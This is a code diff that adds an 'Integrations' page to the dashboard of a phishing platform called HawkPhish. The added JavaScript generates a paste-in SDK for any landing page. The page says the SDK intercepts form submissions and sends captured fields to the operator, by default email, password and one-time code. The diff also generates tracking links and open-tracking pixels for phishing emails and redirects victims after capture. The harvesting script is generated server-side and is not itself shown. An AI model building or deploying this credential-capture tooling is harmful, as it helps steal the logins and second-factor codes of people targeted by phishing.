@@ -73,6 +73,7 @@
                 <a href="#" onclick="showPage('proxies')" class="nav-item flex items-center gap-3 px-4 py-3 rounded-lg text-sm"><i class="fas fa-shield-halved w-5"></i>Proxies</a>
                 <a href="#" onclick="showPage('smtp-server')" class="nav-item flex items-center gap-3 px-4 py-3 rounded-lg text-sm"><i class="fas fa-server w-5"></i>SMTP Server</a>
                 <a href="#" onclick="showPage('audit-logs')" class="nav-item flex items-center gap-3 px-4 py-3 rounded-lg text-sm"><i class="fas fa-clipboard-list w-5"></i>Audit Logs</a>
+                <a href="#" onclick="showPage('integrations')" class="nav-item flex items-center gap-3 px-4 py-3 rounded-lg text-sm"><i class="fas fa-plug w-5"></i>Integrations</a>
                 <div class="border-t border-white/10 my-2"></div>
                 <a href="#" onclick="showPage('about')" class="nav-item flex items-center gap-3 px-4 py-3 rounded-lg text-sm"><i class="fas fa-info-circle w-5"></i>About</a>
             </nav>
@@ -158,6 +159,7 @@
             case 'proxies': return renderProxies(el);
             case 'smtp-server': return renderSMTPServer(el);
             case 'audit-logs': return renderAuditLogs(el);
+            case 'integrations': return renderIntegrations(el);
             case 'about': return renderAbout(el);
         }
     }
@@ -1719,6 +1721,217 @@ socks4|proxy.example.com|1080||
             toast('No proxies parsed. Check the format.', 'error');
         }
         showPage('proxies');
+    }
+
+    // ========== INTEGRATIONS ==========
+    async function renderIntegrations(el) {
+        const campaigns = (await api('/api/campaigns')) || [];
+        const landingPages = (await api('/api/landing-pages')) || [];
+        const baseUrl = window.location.origin;
+        
+        el.innerHTML = `
+            <div class="flex items-center justify-between mb-8">
+                <div><h2 class="text-2xl md:text-3xl font-bold">External Integration</h2><p class="text-gray-400 mt-1">Drop-in SDK for any landing page — hosted anywhere, works with everything</p></div>
+            </div>
+            
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
+                <div class="glass rounded-xl p-6">
+                    <h3 class="font-semibold mb-4 flex items-center gap-2"><i class="fas fa-code text-blue-400"></i> JavaScript SDK Generator</h3>
+                    <p class="text-sm text-gray-400 mb-4">Paste this snippet into any HTML page. It auto-captures all form submissions, tracks opens/clicks, and sends data to HawkPhish.</p>
+                    
+                    <div class="space-y-3 mb-4">
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Campaign (optional)</label>
+                            <select id="sdk-campaign" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm text-white">
+                                <option value="">None</option>
+                                ${campaigns.map(c => `<option value="${c.id}">${c.name}</option>`).join('')}
+                            </select>
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Landing Page (optional)</label>
+                            <select id="sdk-lp" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm text-white">
+                                <option value="">None</option>
+                                ${landingPages.map(p => `<option value="${p.id}">${p.name}</option>`).join('')}
+                            </select>
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Capture Fields (comma separated)</label>
+                            <input id="sdk-fields" value="email,password,otp" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm">
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Redirect URL after capture</label>
+                            <input id="sdk-redirect" placeholder="https://google.com" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm">
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Your HawkPhish URL</label>
+                            <input id="sdk-baseurl" value="${baseUrl}" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm">
+                        </div>
+                    </div>
+                    
+                    <button onclick="generateSDK()" class="w-full btn-primary py-2.5 rounded-lg font-medium mb-4"><i class="fas fa-magic mr-2"></i>Generate SDK</button>
+                    
+                    <div id="sdk-output" class="hidden">
+                        <label class="text-xs text-gray-400 mb-1 block">Copy & Paste This Code</label>
+                        <div class="relative">
+                            <textarea id="sdk-code" rows="12" class="w-full bg-black/30 border border-white/20 rounded-lg px-4 py-3 font-mono text-xs text-green-400" readonly></textarea>
+                            <button onclick="copySDK()" class="absolute top-2 right-2 text-xs px-2 py-1 rounded bg-white/10 hover:bg-white/20 text-gray-400"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <div class="mt-3 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
+                            <p class="text-xs text-yellow-400"><i class="fas fa-lightbulb mr-1"></i><strong>How to use:</strong> Paste this code just before the closing <code>&lt;/body&gt;</code> tag on any landing page. Forms will be auto-intercepted, tracking_id will be read from URL, and all captured data will be sent to your HawkPhish server.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="glass rounded-xl p-6">
+                    <h3 class="font-semibold mb-4 flex items-center gap-2"><i class="fas fa-link text-green-400"></i> Tracking Link Generator</h3>
+                    <p class="text-sm text-gray-400 mb-4">Generate tracking links that can be used in emails to point to external landing pages.</p>
+                    
+                    <div class="space-y-3 mb-4">
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Tracking ID</label>
+                            <input id="link-tid" placeholder="abc123def456" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm">
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">External Landing Page URL</label>
+                            <input id="link-external" placeholder="https://your-phish-site.com/login" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm">
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-400 mb-1 block">Or use HawkPhish hosted page</label>
+                            <select id="link-lp" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5 text-sm text-white">
+                                <option value="">Use external URL above</option>
+                                ${landingPages.map(p => `<option value="${p.id}">${p.name}</option>`).join('')}
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <button onclick="generateLink()" class="w-full btn-primary py-2.5 rounded-lg font-medium mb-4"><i class="fas fa-link mr-2"></i>Generate Link</button>
+                    
+                    <div id="link-output" class="hidden">
+                        <div class="space-y-3">
+                            <div>
+                                <label class="text-xs text-gray-400 mb-1 block">Tracking Link</label>
+                                <div class="flex gap-2">
+                                    <input id="link-result" class="flex-1 bg-black/30 border border-white/20 rounded-lg px-4 py-2.5 font-mono text-xs text-blue-400" readonly>
+                                    <button onclick="copyLink()" class="px-3 py-2.5 rounded-lg bg-white/10 hover:bg-white/20 text-gray-400"><i class="fas fa-copy"></i></button>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="text-xs text-gray-400 mb-1 block">Tracking Pixel (for opens)</label>
+                                <div class="flex gap-2">
+                                    <input id="pixel-result" class="flex-1 bg-black/30 border border-white/20 rounded-lg px-4 py-2.5 font-mono text-xs text-blue-400" readonly>
+                                    <button onclick="copyPixel()" class="px-3 py-2.5 rounded-lg bg-white/10 hover:bg-white/20 text-gray-400"><i class="fas fa-copy"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="glass rounded-xl p-6">
+                <h3 class="font-semibold mb-4 flex items-center gap-2"><i class="fas fa-book text-purple-400"></i> Integration Guide</h3>
+                <div class="space-y-4 text-sm text-gray-400">
+                    <div class="flex gap-3">
+                        <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-bold">1</div>
+                        <div>
+                            <p class="font-medium text-white">Create a campaign</p>
+                            <p>Set up your target group, email template, and SMTP config.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3">
+                        <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-bold">2</div>
+                        <div>
+                            <p class="font-medium text-white">Build your landing page</p>
+                            <p>Create any HTML page with forms. Host it anywhere — free hosting, your own server, or even a CDN.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3">
+                        <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-bold">3</div>
+                        <div>
+                            <p class="font-medium text-white">Paste the SDK</p>
+                            <p>Copy the generated JavaScript code and paste it before <code>&lt;/body&gt;</code>. It will auto-detect forms, intercept submissions, and send data to HawkPhish.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3">
+                        <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-bold">4</div>
+                        <div>
+                            <p class="font-medium text-white">Add tracking to links</p>
+                            <p>Append <code>?tracking_id=TRACKING_ID</code> to your landing page URL in the email. The SDK will read this and associate all captures with the correct recipient.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3">
+                        <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 text-blue-400 font-bold">5</div>
+                        <div>
+                            <p class="font-medium text-white">Track everything</p>
+                            <p>Opens, clicks, form submissions, and all captured fields appear in your HawkPhish dashboard in real-time.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="mt-6 p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
+                    <p class="text-sm text-green-400"><i class="fas fa-check-circle mr-2"></i><strong>Works with anything:</strong> WordPress, GitHub Pages, Netlify, Vercel, free hosting, shared hosting, or any custom HTML. No server-side code required.</p>
+                </div>
+            </div>`;
+    }
+
+    async function generateSDK() {
+        const baseUrl = document.getElementById('sdk-baseurl').value;
+        const campaignId = document.getElementById('sdk-campaign').value;
+        const landingPageId = document.getElementById('sdk-lp').value;
+        const fields = document.getElementById('sdk-fields').value;
+        const redirect = document.getElementById('sdk-redirect').value;
+        
+        const r = await api('/api/external/generate-sdk', 'POST', {
+            base_url: baseUrl,
+            campaign_id: campaignId ? parseInt(campaignId) : null,
+            landing_page_id: landingPageId ? parseInt(landingPageId) : null,
+            capture_fields: fields.split(',').map(f => f.trim()).filter(f => f),
+            redirect_url: redirect || null,
+        });
+        
+        if (r.sdk) {
+            document.getElementById('sdk-code').value = r.sdk;
+            document.getElementById('sdk-output').classList.remove('hidden');
+        }
+    }
+
+    function copySDK() {
+        const el = document.getElementById('sdk-code');
+        el.select();
+        document.execCommand('copy');
+        toast('SDK copied to clipboard!');
+    }
+
+    async function generateLink() {
+        const tid = document.getElementById('link-tid').value;
+        const external = document.getElementById('link-external').value;
+        const lpId = document.getElementById('link-lp').value;
+        
+        const r = await api('/api/external/generate-link', 'POST', {
+            base_url: window.location.origin,
+            tracking_id: tid,
+            landing_page_id: lpId ? parseInt(lpId) : null,
+            external_url: external || null,
+        });
+        
+        if (r.link) {
+            document.getElementById('link-result').value = r.link;
+            document.getElementById('pixel-result').value = r.pixel;
+            document.getElementById('link-output').classList.remove('hidden');
+        }
+    }
+
+    function copyLink() {
+        const el = document.getElementById('link-result');
+        el.select();
+        document.execCommand('copy');
+        toast('Link copied!');
+    }
+
+    function copyPixel() {
+        const el = document.getElementById('pixel-result');
+        el.select();
+        document.execCommand('copy');
+        toast('Pixel copied!');
     }
 
     // ========== AUDIT LOGS ==========
